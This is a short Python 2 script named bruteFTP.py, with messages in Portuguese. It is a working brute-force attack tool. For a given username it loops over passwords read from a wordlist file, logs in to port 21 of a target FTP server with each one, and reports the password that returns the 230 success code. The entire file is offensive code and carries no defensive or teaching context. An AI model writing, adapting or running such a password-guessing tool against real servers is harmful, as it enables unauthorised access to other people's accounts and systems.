#!/usr/bin/python
import socket, sys, re

if len(sys.argv) < 2:
	print "Use python bruteFTP.py 127.0.0.1 usuario"
else:
	usuario = sys.argv[2]

	file = open("lista.txt")
	for linha in file.readlines():
		print "Testando com %s:%s"%(usuario,linha)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((sys.argv[1],21))
		s.recv(1024)
		s.send("USER "+usuario+"\r\n")
		s.recv(1024)
		s.send("PASS "+linha+"\r\n")
		resulta = s.recv(1024)
		s.send("QUIT\r\n")

		if re.search("230", resulta):
			print "[+] ==>>> SENHA ENCONTRADA <<<==%s"%(linha)
			break
		else:
			print "[-] ==>>> ACESSO NEGADO <<<=="
